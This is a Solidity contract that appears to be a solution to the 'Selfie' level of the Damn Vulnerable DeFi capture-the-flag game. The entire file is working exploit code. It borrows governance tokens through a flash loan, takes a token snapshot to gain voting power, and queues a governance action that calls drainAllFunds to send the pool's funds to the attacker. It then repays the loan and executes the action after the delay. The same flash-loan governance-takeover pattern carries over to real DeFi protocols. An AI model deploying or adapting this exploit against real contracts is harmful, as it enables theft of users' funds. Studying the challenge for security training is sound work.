pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract AttackerSelfie {
    address selfiePool;
    address governance;
    address token;
    uint actionId;

    constructor (address _selfiePool, address _governance, address _token) {
        selfiePool = _selfiePool;
        governance = _governance;
        token = _token;
    }

    function takeSelfie() external {
        ISelfiePool(selfiePool).flashLoan(1500000 ether);
    }

    function queueActionToDrain() external {
        actionId = ISimpleGovernance(governance).queueAction(
            selfiePool, 
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                tx.origin
            ),
            0);
    }

    function drainAfterDelay() external {
        ISimpleGovernance(governance).executeAction(actionId);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        IERC20(token).transfer(selfiePool,borrowAmount);
    }
}